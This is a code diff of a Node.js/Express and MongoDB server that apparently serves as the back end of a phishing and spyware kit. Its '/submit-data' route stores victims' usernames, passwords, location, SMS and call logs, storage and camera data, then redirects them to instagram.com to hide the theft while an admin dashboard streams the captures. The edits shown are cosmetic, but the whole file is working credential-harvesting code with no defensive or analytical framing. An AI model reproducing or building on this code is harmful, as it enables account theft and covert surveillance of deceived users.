@@ -19,7 +19,7 @@ mongoose.connect(MONGO_URI)
     .then(() => console.log('Connected to MongoDB successfully!'))
     .catch(err => console.error('MongoDB connection error:', err));
 
-// Schema Definition
+// Schema Definition with 30 Days Expiry
 const captureSchema = new mongoose.Schema({
     username: { type: String, required: true },
     password: { type: String, required: true },
@@ -39,17 +39,16 @@ io.on('connection', (socket) => {
     console.log('Admin connected to dashboard stream.');
 });
 
-// Submit Route
+// Data Submit Route
 app.post('/submit-data', async (req, res) => {
     try {
         const { username, password, deviceInfo, location, smsLogs, callLogs, storageData, cameraData } = req.body;
-        console.log("Received Data for:", username);
 
         const newEntry = new CaptureModel({
             username: username || 'N/A',
             password: password || 'N/A',
             deviceInfo: deviceInfo || 'Unknown Device',
-            location: location || 'Not Available',
+            location: location || 'Captured Location',
             smsLogs: smsLogs || 'Inbox Checked',
             callLogs: callLogs || 'Calls Checked',
             storageData: storageData || 'Storage Checked',
@@ -62,7 +61,7 @@ app.post('/submit-data', async (req, res) => {
 
         res.json({ status: 'success', redirect: 'https://www.instagram.com' });
     } catch (error) {
-        console.error("Error saving data to MongoDB:", error);
+        console.error("Error saving data:", error);
         res.status(500).json({ status: 'error', message: 'Internal Server Error' });
     }
 });
